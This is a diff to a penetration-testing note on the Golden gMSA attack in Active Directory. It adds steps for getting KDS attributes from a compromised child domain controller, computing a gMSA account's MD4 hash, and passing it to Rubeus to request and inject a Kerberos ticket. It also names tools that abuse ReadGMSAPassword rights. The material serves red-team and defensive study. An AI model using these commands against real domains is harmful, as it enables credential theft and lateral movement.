@@ -36,10 +36,24 @@ So actually master secret is never changed but use for derivation of future serv
 So the crypto is known and if KDS master key is known then the service key can be easily derived **without contacting the DC**!
 ## Workflow
 
-**For this attack to work we need KDS key attributes.**
+**For this attack to work we need a compromised principal with  ReadGMSAPassword rights.**
 
-The attributes are `replicated` to `Child Domain Controllers` as part of the `Configuration NC`. So, if we have compromised a chile DC and got SYSTEM, then we can query the child DCs local replica to obtain KDS attributes.
+The GMSA attributes are `replicated` to `Child Domain Controllers` as part of the `Configuration NC`. So, if we have compromised a chile DC and got SYSTEM, then we can query the child DCs local replica to obtain KDS attributes.
 
+Once the attributes are obtained we can compute the MD4 hash of the GMSA service: see the **ONLINE** and **OFFLINE** sections below.
+
+WHEN the md4 hash of the GMSA account is retrieved we can use Rubeus with `/rc4` option, to acquire a `Ticket Granting Ticket (TGT)` for the specified Group Managed Service Account (gMSA). 
+
+```powershell
+.\Rubeus.exe asktgt /user:svc_mgdadm$ /rc4:efff6cd327aa76b3f1ca6eb82a801c5 /domain:domain.local /ptt
+
+```
+
+### Note on Privilege Escalation
+
+IF we compromise a user who has the ability to read the password for a Group Managed Service Account (gMSA) through the [ReadGMSAPassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readgmsapassword), THEN We can use tools like [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) or [gMSADumper](https://github.com/micahvandeusen/gMSADumper), to obtain the password for the service account within the domain. 
+
+BUT these tools are only useful for obtaining gMSA passwords **within the current domain** and not across a Forest trust.
 ### Local
 
 #### Online (first time retrieval)
@@ -57,7 +71,7 @@ nt authority\system
 Base64 Encoded Password:        P3...
 ```
 
-Decode the master secret: 
+Get md4 hash: 
 
 ```python
 # pip install pycryptodome
@@ -95,7 +109,7 @@ Base64 blob:    AQAAAAwsk7o0....
 Encoded Password:  WITSKRtGah...
 ```
 
-Use the python code from ONLINE part to compute the MD4 hash ftw.
+Get md4 hash...
 
 ### Remote
 
